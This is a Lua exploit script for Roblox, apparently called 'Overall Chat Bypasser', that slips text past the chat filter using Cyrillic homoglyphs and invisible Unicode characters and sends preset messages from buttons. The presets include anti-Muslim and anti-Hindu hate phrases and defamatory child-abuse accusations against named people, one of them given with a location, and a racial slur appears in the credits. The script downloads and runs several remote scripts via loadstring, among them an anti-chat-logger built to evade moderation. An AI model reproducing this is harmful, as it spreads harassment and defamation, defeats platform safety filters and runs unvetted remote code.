        {"god is an extremist", "God is an e⁥⁥⁥x⁥⁥⁥t⁥⁥⁥r⁥⁥⁥e⁥⁥⁥m⁥⁥⁥i⁥⁥⁥s⁥⁥⁥t "},
        {"muslims who wear hijabs are bombers", "m⁥⁥⁥u⁥⁥⁥s⁥⁥⁥l⁥⁥⁥i⁥⁥⁥m⁥⁥⁥s who wear hi⁥⁥⁥ja⁥⁥⁥bs are bo⁥⁥⁥mb⁥⁥⁥e⁥⁥⁥rs"},
        {"hinduism is full of smelly packys", "h⁥⁥⁥ind⁥⁥⁥uis⁥⁥⁥m is full of s⁥⁥⁥m⁥⁥⁥e⁥⁥⁥l⁥⁥⁥l⁥⁥⁥y p⁥⁥⁥ack⁥⁥⁥ys⁥⁥⁥"},
        {"9/11 was caused by muslims", "9⁥⁥⁥/⁥⁥⁥1⁥⁥⁥1⁥⁥⁥ w⁥⁥⁥as cau⁥⁥⁥sed by mus⁥⁥⁥l⁥⁥⁥im⁥⁥⁥s"},
        {"my favourite religion is the Taliban", "m⁥⁥⁥y f⁥⁥⁥a⁥⁥⁥v⁥⁥⁥o⁥⁥⁥u⁥⁥⁥r⁥⁥⁥i⁥⁥⁥t⁥⁥⁥e r⁥⁥⁥e⁥⁥⁥l⁥⁥⁥i⁥⁥⁥g⁥⁥⁥i⁥⁥⁥o⁥⁥⁥n i⁥⁥⁥s t⁥⁥⁥h⁥⁥⁥e T⁥⁥⁥a⁥⁥⁥l⁥⁥⁥i⁥⁥⁥b⁥⁥⁥a⁥⁥⁥n⁥⁥⁥"},
    
    },

    ["Other"] = {
        {"lmfaoooo", "ӏ⁥⁥⁥m⁥⁥⁥f⁥⁥⁥а⁥⁥⁥о⁥⁥⁥о⁥⁥⁥о⁥⁥⁥о"},
        {"synapsex", "ѕ⁥⁥⁥у⁥⁥⁥n⁥⁥⁥а⁥⁥⁥р⁥⁥⁥ѕ⁥⁥⁥е⁥⁥⁥х"},
        {"lmaoooo", "ӏ⁥⁥⁥m⁥⁥⁥а⁥⁥⁥о⁥⁥⁥о⁥⁥⁥о⁥⁥⁥о"},
    },

    ["Ads"] = {
        {"Overall", "Overall Chat Bypasser Is Amazing"},
        {"Check Out Overall on Discord", "Check Out O⁥⁥⁥ver⁥⁥⁥all⁥⁥⁥ on⁥⁥⁥ D⁥⁥⁥SC⁥⁥⁥"},
        {"Invite Code", "Invite Code Is G⁥⁥⁥m⁥⁥⁥3⁥⁥⁥8⁥⁥⁥S⁥⁥⁥2⁥⁥⁥c⁥⁥⁥j⁥⁥⁥p⁥⁥⁥V⁥⁥⁥"},
    },
    
    ["Shame"] = {
        {"cj likes kids", "cj likes kids"},
        {"Kieron likes little girls", "Kieron likes l⁥⁥⁥i⁥⁥⁥t⁥⁥⁥t⁥⁥⁥l⁥⁥⁥e g⁥⁥⁥i⁥⁥⁥r⁥⁥⁥l⁥⁥⁥s"},
        {"Louis lives in Louisiana, Lake Charles", "Louis liv⁥⁥⁥es in Lo⁥⁥⁥ui⁥⁥⁥si⁥⁥⁥an⁥⁥⁥a, La⁥⁥⁥ke Ch⁥⁥⁥ar⁥⁥⁥le⁥⁥⁥s"},

    }
}

local Cipher = LasBypasses["Words"] or {}

loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))() -- Anti Screenshot
loadstring(game:HttpGet("https://gist.githubusercontent.com/lexsplorsex/8a3026a12d578d3f5c8abca061710f6d/raw/7ae3ad27662342a8f07fb3a73ae0d252424722bf/gistfile1.txt"))() -- Anti Chat Logger

task.wait(0.2)

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local DevTools = loadstring(game:HttpGet("https://raw.githubusercontent.com/05-4/DevTools/main/index.lua"))()
  
local Window = DevTools:Init({
    Name = "Overall Chat Bypasser",
    Title = "Overall",
    Subtitle = "Bypasser",
    LoadingBackgroundImage = "http://www.roblox.com/asset/?id=14931217247",
    Options = {
        KillYourself = false,
        FOVAnimations = false,
    }
})

local Home = Window:CreateTab({ Name = "Home", Icon = "rbxassetid://6026568198" })
local Settings = Window:CreateTab({ Name = "Settings", Icon = "rbxassetid://6031280882" })
local ScriptHub = Window:CreateTab({ Name = "ScriptHub", Icon = "http://www.roblox.com/asset/?id=169611105" })

Window:SetProfileTitle(game:GetService("Players").LocalPlayer.Name)

local TabsInstance = Window.Interface.Main.Sidebar.Tabs
local Divider = TabsInstance.Template:Clone()

Divider.Parent = TabsInstance
Divider.Name = "Divider"

Divider.Title.AnchorPoint = Vector2.new(.5, 0)
Divider.Title.Position = UDim2.new(.5, 0, 0.1, 0)
Divider.Title.TextColor3 = Color3.fromRGB(255, 255, 255)

Divider.Title.TextTransparency = 1

Divider.Title.FontFace.Weight = Enum.FontWeight.Regular

Divider.Button:Destroy()
Divider.SelectionBox:Destroy()
Divider.Icon:Destroy()

Divider.Title.Text = "-BYPASSES!-"
Divider.Title.TextSize = 14
Divider.SelectionOrder = 3
Divider.Visible = true

TweenService:Create(Divider.Title, TweenInfo.new(.6), { TextTransparency = 0 }):Play()

task.wait(.2)

function Chat(Message)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, "All")
end

local BypassCache = {}
local loaded = 0


local ChatTextBox = game:GetService("Players").LocalPlayer.PlayerGui
    :WaitForChild("Chat")
    :WaitForChild("Frame")
    :WaitForChild("ChatBarParentFrame")
    :WaitForChild("Frame")
    :WaitForChild("BoxFrame")
    :WaitForChild("Frame")
    :WaitForChild("ChatBar")

for TabName, _ in next, LasBypasses do
    BypassCache[TabName] = Window:CreateTab({ Name = TabName });
end

Home:CreateSection("Discord")
Home:CreateLabel("https://discord.gg/eXXyuc7Mcd")
Home:CreateLabel("Join Our Discord For Updates!")

Home:CreateSection("Credits")
Home:CreateLabel("Owners\n\n  •   lexplorsex\n  •  StickyDonkey\n\nBypasses\n\n  •    lexplorsex  •  StickyDonkey  •  Users In Overall Discord\n\nExecutor\n\n  •  StickyDonkey")

Home:CreateSection("Changelog")
Home:CreateLabel("v.2.1 Echo")
Home:CreateLabel("New Bypasses, Chat Fix, New Connectivity UI\n\nBan System, New Section, New DSC Ad at join\n\nExecutor (Keyless)")

Home:CreateSection("Notes")
Home:CreateLabel("lexplorsex: The Chat Is Fixed!!")
Home:CreateLabel("stickydonkey: And Thats How The Donkeys Fly")
Home:CreateLabel("DJ Khaled: Life is Roblox.")
Home:CreateLabel("Shoutout To Kronk For Being A Big Dick Ass Nigga")

Settings:CreateSection("Configure Your Game!")
Settings:CreateToggle({
    Name = "Chat Fix",

    Callback = function(Value)
        ManualBypassEnabled = Value
    end
})

ScriptHub:CreateSection("Coming Soon...")

local unicode = "⁥⁥⁥"
local tab = {
    ["a"] = 0x0430,
    ["c"] = 0x0441,
    ["e"] = 0x0435,
    ["j"] = 0x0458,
    ["l"] = 0x04CF,
    ["o"] = 0x043E,
    ["p"] = 0x0440,
    ["x"] = 0x0445,
    ["y"] = 0x0443,
    ["s"] = 0x0455
}

local function bypassString(v)
    local string = {}

    for char in v:gmatch(".") do
        table.insert(string, char)
    end

    local convertedString = ""

    for i, char in ipairs(string) do
        local convertedChar

        if tab[char:lower()] then
            convertedChar = utf8.char(tab[char:lower()])
        else
            convertedChar = char
        end

        convertedString = convertedString .. (convertedChar .. ((i < #string and unicode) or ""))
    end

    return convertedString
end

local function CipherText(v)
    local output = v
    local replacedCharacters = {}

    for _, Phrase in next, Cipher do
        output = string.gsub(output, Phrase[1], function(char)
            table.insert(replacedCharacters, char)
            return Phrase[2]
        end)
    end

    local convertedString = bypassString(output)

    for _, char in ipairs(replacedCharacters) do
        convertedString = convertedString:gsub(char, bypassString(char))
    end

    return convertedString
end

ChatTextBox.FocusLost:Connect(function(EnterPressed)
    if not EnterPressed or not ChatTextBox then
        return
    end

    if ManualBypassEnabled then
        Chat(CipherText(ChatTextBox.Text))
        return
    end

    Chat(ChatTextBox.Text)
end)


for TabName, Bypasses in next, LasBypasses do
    table.sort(Bypasses, function(a, b)
        return a[1]:lower() < b[1]:lower()
    end)

    local function cButton(a)
        BypassCache[TabName]:CreateButton({
            Name = a[1],

            Callback = function()
                Chat(a[2])
            end
        })
    end

    for _, Bypass in next, Bypasses do
        if loaded > 9 then
            task.spawn(function()
                cButton(Bypass)
            end)

            continue
        end

        cButton(Bypass)

        loaded = loaded + 1
    end
end

task.wait(0.2)

loadstring(game:HttpGet("https://raw.githubusercontent.com/lexsplorsex/not/main/.lua"))()

local DiscordLink = (Value) -- Replace with your condition

-- Replace this with your Discord server URL
local discordServerURL = "https://discord.gg/eXXyuc7Mcd"

-- Function to display a message to players
function DisplayMessageToPlayers(message)
    for _, player in ipairs(game.Players:GetPlayers()) do
        local messageGui = Instance.new("Message", player.PlayerGui)
        messageGui.Text = message
        wait(5) -- Display the message for 5 seconds
        messageGui:Destroy()
    end
end

-- Display the message with the Discord server URL
DisplayMessageToPlayers("Join Overall Discord server: " .. discordServerURL)


local Players = game:GetService("Players")
local player = Players.LocalPlayer 

local function createText(player)
    local character = player.Character or player:WaitForChild("Character")

    local text = Instance.new("BillboardGui")
    text.Name = "PlayerText"
    text.Parent = character
    text.Adornee = character:WaitForChild("Head")
    text.Size = UDim2.new(0, 100, 0, 40)
    text.StudsOffset = Vector3.new(0, 3, 0)
    text.AlwaysOnTop = true
    
    text.Active = false
    local background = Instance.new("ImageLabel")
    background.Name = "Background"
    background.Parent = text
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundTransparency = 1
    background.Image = "http://www.roblox.com/asset/?id=14931217247"

    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = text
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Font = Enum.Font.SourceSans
    textLabel.TextSize = 20
    textLabel.TextColor3 = Color3.new(255, 255, 1)
    textLabel.Text = "Overall User!"
    
    textLabel.BackgroundTransparency = 1
    textLabel.TextStrokeTransparency = 0
    
    textLabel.Image = "http://www.roblox.com/asset/?id=14931217247"
end


--[[
















































































































































































































































here we are




























              happy]]--
